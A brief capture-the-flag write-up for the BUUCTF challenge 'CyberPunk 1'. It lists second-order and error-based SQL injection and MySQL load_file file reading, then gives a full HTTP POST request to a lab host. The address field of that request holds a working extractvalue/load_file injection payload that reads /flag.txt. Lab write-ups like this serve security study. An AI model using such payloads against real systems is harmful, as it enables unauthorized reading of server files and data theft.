# WP
[BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web5】CyberPunk 1](https://fanygit.github.io/2021/05/11/[CISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5]CyberPunk%201/)
# 知识点
二次注入<br />报错注入<br />load_file读文件
```http
POST /confirm.php HTTP/1.1
Host: a40b340f-e5c2-498d-9e82-572caf7f79a9.node4.buuoj.cn:81
Content-Length: 115
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://a40b340f-e5c2-498d-9e82-572caf7f79a9.node4.buuoj.cn:81
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://a40b340f-e5c2-498d-9e82-572caf7f79a9.node4.buuoj.cn:81/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

user_name=31&phone=2&address=123'and(select+extractvalue(1,reverse(concat(0x7e,(select+load_file("/flag.txt"))))))#
```
